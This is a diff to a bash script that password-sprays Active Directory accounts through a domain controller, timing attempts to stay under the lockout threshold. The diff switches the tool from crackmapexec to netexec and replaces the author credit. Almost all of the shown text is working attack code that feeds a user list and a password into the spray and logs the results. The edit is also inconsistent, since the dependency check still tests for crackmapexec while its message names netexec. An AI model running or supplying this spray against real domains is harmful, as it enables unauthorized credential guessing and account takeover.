@@ -1,10 +1,10 @@
 #!/bin/bash
-# Password spray AD accounts with crackmapexec according to reset counter and lockout threshold policies
-# Author: Fabrizio Siciliano (@0rbz_)
+# Password spray AD accounts with netexec according to reset counter and lockout threshold policies
+# Author: (@kplei)
 
 which crackmapexec > /dev/null 2>&1
 if [ $? == 1 ]; then
-    echo "Can't find crackmapexec. This tool requires it."
+    echo "Can't find netexec. This tool requires it."
     exit
 fi
 
@@ -86,9 +86,9 @@ while true; do
         echo "[+] Running:" `$t2`
 	if [[ -z $port ]] 
 	  then 
-            crackmapexec $method $dc_ip -u $(cat $dom_users) -p $password 2>/dev/null | tee -a cmespray_output.txt
+            netexec $method $dc_ip -u $(cat $dom_users) -p $password 2>/dev/null | tee -a nxcspray_output.txt
 	else
-	    crackmapexec $method $dc_ip -u $(cat $dom_users) -p $password --port $port 2>/dev/null | tee -a cmespray_output.txt
+	    netexec $method $dc_ip -u $(cat $dom_users) -p $password --port $port 2>/dev/null | tee -a nxcspray_output.txt
 	fi
 
     done
